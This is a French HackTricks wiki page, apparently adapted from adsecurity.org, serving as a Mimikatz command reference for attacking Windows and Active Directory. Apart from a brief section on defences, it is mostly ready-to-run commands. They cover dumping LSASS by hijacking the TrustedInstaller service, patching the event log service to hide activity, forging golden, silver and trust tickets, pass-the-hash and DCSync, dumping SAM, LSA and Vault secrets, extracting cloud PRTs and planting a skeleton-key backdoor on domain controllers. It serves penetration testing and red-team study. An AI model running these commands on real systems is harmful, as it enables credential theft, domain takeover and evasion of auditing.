# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Cette page est basée sur une page de [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Consultez l’original pour plus d’informations !<sup>[[3]](#references)</sup>

## LM et Clear-Text en mémoire

À partir de Windows 8.1 et Windows Server 2012 R2, des mesures importantes ont été mises en place pour se protéger contre le vol de credentials :

- **Les hashes LM et les mots de passe en plain-text** ne sont plus stockés en mémoire afin d’améliorer la sécurité. Un paramètre spécifique du registre, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, doit être configuré avec une valeur DWORD de `0` pour désactiver Digest Authentication et garantir que les mots de passe "clear-text" ne sont pas mis en cache dans LSASS.

- **LSA Protection** est introduite afin de protéger le processus Local Security Authority (LSA) contre la lecture non autorisée de la mémoire et l’injection de code. Cela est réalisé en marquant LSASS comme un protected process. L’activation de LSA Protection implique :
1. Modifier le registre à _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ en définissant `RunAsPPL` sur `dword:00000001`.
2. Implémenter un Group Policy Object (GPO) qui applique cette modification du registre sur les appareils gérés.

Malgré ces protections, des tools comme Mimikatz peuvent contourner LSA Protection à l’aide de drivers spécifiques, bien que ces actions soient probablement enregistrées dans les event logs.

Sur les workstations modernes, cela est encore plus important, car **Credential Guard est activé par défaut sur de nombreux systèmes Windows 11 22H2+ et Windows Server 2025 joints au domaine et non-DC**, tandis que **LSASS-as-PPL est activé par défaut sur les nouvelles installations de Windows 11 22H2+**. En pratique, cela signifie que `sekurlsa::logonpasswords` fournit souvent moins d’informations que ce que les anciennes techniques laissaient attendre, et que les operators se tournent de plus en plus vers les **offline minidumps**, l’**extraction de clés Kerberos (`sekurlsa::ekeys`)** ou les modules orientés **CloudAP/PRT**. Pour la partie protection, consultez [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Les administrateurs disposent généralement de SeDebugPrivilege, ce qui leur permet de debugger des programmes. Ce privilege peut être restreint afin d’empêcher les memory dumps non autorisés, une technique couramment utilisée par les attackers pour extraire des credentials de la mémoire. Toutefois, même lorsque ce privilege est supprimé, le compte TrustedInstaller peut toujours effectuer des memory dumps à l’aide d’une configuration de service personnalisée :
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Cela permet de dumper la mémoire de `lsass.exe` dans un fichier, qui peut ensuite être analysé sur un autre système afin d'extraire les identifiants :
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Options de Mimikatz

La falsification des journaux d'événements dans Mimikatz implique deux actions principales : effacer les journaux d'événements et patcher le service Event afin d'empêcher la journalisation de nouveaux événements. Voici les commandes permettant d'effectuer ces actions :

#### Effacement des journaux d'événements

- **Commande** : cette action vise à supprimer les journaux d'événements, rendant plus difficile le suivi des activités malveillantes.
- Mimikatz ne fournit pas de commande directe dans sa documentation standard pour effacer les journaux d'événements directement via sa ligne de commande. Toutefois, la manipulation des journaux d'événements implique généralement l'utilisation d'outils système ou de scripts externes à Mimikatz pour effacer des journaux spécifiques (par exemple, avec PowerShell ou l'Observateur d'événements Windows).

#### Fonctionnalité expérimentale : patching du service Event

- **Commande** : `event::drop`
- Cette commande expérimentale est conçue pour modifier le comportement du Event Logging Service, l'empêchant ainsi d'enregistrer de nouveaux événements.
- Exemple : `mimikatz "privilege::debug" "event::drop" exit`

- La commande `privilege::debug` garantit que Mimikatz dispose des privilèges nécessaires pour modifier les services système.
- La commande `event::drop` patche ensuite le service Event Logging.

### Attaques de tickets Kerberos

Utilisez les commandes ci-dessous comme rappels rapides de syntaxe. Les pages dédiées aux [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) et [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contiennent les informations à jour sur les subtilités liées à AES/PAC/opsec.

### Création d'un Golden Ticket

Un Golden Ticket permet une usurpation avec accès à l'ensemble du domaine. Commande et paramètres principaux :

- Commande : `kerberos::golden`
- Paramètres :
- `/domain` : le nom du domaine.
- `/sid` : l'identifiant de sécurité (SID) du domaine.
- `/user` : le nom d'utilisateur à usurper.
- `/krbtgt` : le hash NTLM du compte de service KDC du domaine.
- `/ptt` : injecte directement le ticket en mémoire.
- `/ticket` : enregistre le ticket pour une utilisation ultérieure.

Exemple :
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Les Silver Tickets accordent l'accès à des services spécifiques. Commande et paramètres principaux :

- Commande : similaire au Golden Ticket, mais cible des services spécifiques.
- Paramètres :
- `/service` : le service à cibler (par exemple, cifs, http).
- Autres paramètres similaires à ceux du Golden Ticket.

Exemple :
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Création de Trust Tickets

Les Trust Tickets sont utilisés pour accéder à des ressources entre domaines en exploitant les relations d’approbation. Commande et paramètres principaux :

- Commande : Similaire à Golden Ticket, mais pour les relations d’approbation.
- Paramètres :
- `/target` : Le FQDN du domaine cible.
- `/rc4` : Le hash NTLM du compte d’approbation.

Exemple :
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Commandes Kerberos supplémentaires

- **Listing Tickets** :

- Commande : `kerberos::list`
- Liste tous les tickets Kerberos de la session utilisateur actuelle.

- **Pass the Cache** :

- Commande : `kerberos::ptc`
- Injecte des tickets Kerberos à partir de fichiers de cache.
- Exemple : `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket** :

- Commande : `kerberos::ptt`
- Permet d'utiliser un ticket Kerberos dans une autre session.
- Exemple : `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets** :
- Commande : `kerberos::purge`
- Supprime tous les tickets Kerberos de la session.
- Utile avant d'utiliser des commandes de manipulation de tickets afin d'éviter les conflits.

### Over-Pass-the-Hash / Pass-the-Key

Si `RC4` est désactivé ou peu fiable, Mimikatz peut patcher les **clés Kerberos AES128/AES256** dans la session de connexion actuelle au lieu d'utiliser uniquement un hash NT. Cette approche est généralement mieux adaptée aux domaines modernes que de considérer `sekurlsa::pth` comme limité à NTLM.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` réutilise le processus actuel au lieu de lancer une nouvelle console, ce qui est pratique lorsque vous voulez exécuter immédiatement des commandes comme `lsadump::dcsync` dans le même contexte.

### Modification d’Active Directory

- **DCShadow** : Faire temporairement agir une machine comme un DC pour manipuler des objets AD. Voir [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync** : Imiter un DC pour demander des données de mot de passe. Voir [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Accès aux credentials

- **LSADUMP::LSA** : Extraire les credentials de LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync** : Usurper l’identité d’un DC à l’aide des données de mot de passe d’un compte d’ordinateur.

- _Aucune commande spécifique fournie pour NetSync dans le contexte original._

- **LSADUMP::SAM** : Accéder à la base de données SAM locale.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets** : Déchiffrer les secrets stockés dans le registre.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM** : Définir un nouveau hash NTLM pour un utilisateur.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust** : Récupérer les informations d’authentification des relations d’approbation.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Sur les hôtes **Entra ID** ou **hybrid-joined**, `sekurlsa::cloudap` peut exposer les données mises en cache du **Primary Refresh Token (PRT)** depuis LSASS. Si la clé associée de **Proof-of-Possession** est protégée par logiciel, `dpapi::cloudapkd` peut dériver les données de clé en clair ou dérivées nécessaires aux workflows **Pass-the-PRT** ultérieurs.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Cela devient beaucoup plus difficile lorsque la clé est protégée par le TPM, mais il vaut la peine de vérifier les endpoints hybrides, car les données CloudAP mises en cache peuvent être plus intéressantes que la sortie classique de `wdigest`.<sup>[[2]](#references)</sup> Pour la chaîne d’abus côté cloud, voir [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Divers

- **MISC::Skeleton** : Injecter une backdoor dans LSASS sur un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Élévation de privilèges

- **PRIVILEGE::Backup** : Acquérir les droits de sauvegarde.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug** : Obtenir les privilèges de debug.
- `mimikatz "privilege::debug" exit`

### Dumping de credentials

- **SEKURLSA::LogonPasswords** : Afficher les credentials des utilisateurs connectés.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets** : Extraire les tickets Kerberos de la mémoire.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulation des SID et des tokens

- **SID::add/modify** : Modifier le SID et le SIDHistory.

- Add : `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify : _Aucune commande spécifique pour modify dans le contexte original._

- **TOKEN::Elevate** : Usurper des tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP** : Autoriser plusieurs sessions RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions** : Lister les sessions TS/RDP.
- _Aucune commande spécifique fournie pour TS::Sessions dans le contexte original._

### Vault

- Extraire les mots de passe du Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## Références

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
